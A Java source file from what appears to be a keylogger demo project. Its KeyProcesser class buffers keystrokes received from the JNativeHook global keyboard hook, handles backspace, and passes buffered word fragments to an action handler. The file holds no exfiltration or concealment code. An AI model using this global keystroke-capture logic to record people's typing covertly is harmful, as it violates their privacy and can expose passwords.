package com.suchocki.keyloggerdemo.dataprocessing;

import org.jnativehook.keyboard.NativeKeyEvent;

import com.suchocki.keyloggerdemo.datastorage.KeyBufferArrayListImpl;
import com.suchocki.keyloggerdemo.datastorage.Keybuffer;

public class KeyProcesser {

	private final int BUFFER_SIZE;
	private Keybuffer keyBuffer;
	private ActionPerformer actionPerformer;

	public KeyProcesser(ActionPerformer actionPerformer, int maxWordLength) {
		this.actionPerformer = actionPerformer;
		BUFFER_SIZE = maxWordLength;
		keyBuffer = new KeyBufferArrayListImpl(BUFFER_SIZE);
	}

	public void addKey(int keyCode) {
		if (keyCode == NativeKeyEvent.VC_BACKSPACE) {
			keyBuffer.removeLastKey();
		} else {
			keyBuffer.addKey(NativeKeyEvent.getKeyText(keyCode));
			passWordsToActionPerformer();
		}
	}

	private void passWordsToActionPerformer() {
		for (int i = 0; i < keyBuffer.getElementsNumber(); i++) {
			actionPerformer.performAction(keyBuffer.getPartOfBuffer(i, keyBuffer.getElementsNumber()));
		}
	}

}
